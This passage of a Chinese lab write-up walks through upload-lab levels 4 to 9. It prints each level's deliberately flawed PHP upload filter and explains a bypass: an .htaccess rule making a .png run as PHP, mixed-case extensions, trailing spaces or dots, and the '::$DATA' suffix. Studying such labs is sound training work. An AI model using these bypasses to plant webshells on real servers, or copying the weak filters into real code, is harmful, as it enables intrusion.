class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h2><p>这下禁止上传的文件类型有很多种，我们可以尝试传一个<code>.htaccess</code>文件来把<code>.png</code>文件解析为<code>.php</code>类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;webshell.png&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h2><p>相比与第四关，第五关少了转换为小写的这一步骤，因此可以尝试修改为<code>.Php</code>后缀上传，连接成功。</p><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h2><p>这次的代码和之前相比少了首尾去空，因此可以尝试在末尾加上空格，但是我们在本地是无法在末尾添加上空格的，所以需要在burpsuite抓包中修改上传的文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673682906593-0bfa79c4-182f-48d5-b349-280cda650687.png" alt="e4d6f42cc4fc3bf888b6ceb79f1001e.png"><br>这样就可以上传成功。</p><h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h2><p>这次缺少了删除文件末尾的点，因此可以在文件末尾添加点来绕过，还是直接在bp中修改文件名并上传即可。</p><h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h2><p>这次缺少了对字符串<code>::$DATA</code>的检测，因此使用bp在文件末尾添加对应字符，连接成功。<br>查询之后发现：在window的时候如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名<br>例如:”<code>phpinfo.php::$DATA</code>“Windows会自动去掉末尾的<code>::$DATA</code>变成”<code>phpinfo.php</code>“</p><h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span 